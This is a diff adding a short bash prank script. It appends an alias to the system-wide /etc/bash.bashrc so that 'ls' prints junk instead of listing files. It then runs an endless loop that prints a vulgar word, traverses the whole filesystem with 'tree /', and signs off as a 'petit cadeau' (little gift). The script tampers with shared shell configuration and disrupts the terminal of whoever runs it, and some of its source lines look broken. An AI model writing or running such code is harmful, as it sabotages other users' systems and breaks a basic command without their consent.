@@ -1,0 +1,24 @@
+#!/bin/bash
+
+ls 
+cd ~
+
+echo "alias ls='echo"PRORRORORORORO"'" >> /etc/bash.bashrc
+
+source .bashrc
+
+source bash.bashrc
+
+ls 
+
+while true
+do
+
+    echo "PORNOOOOOOOOOOOOO "
+    sleep 1
+    tree / ;
+    sleep 1
+    echo " 
+    
+    PETIT CADEAU DE NOGE "
+done
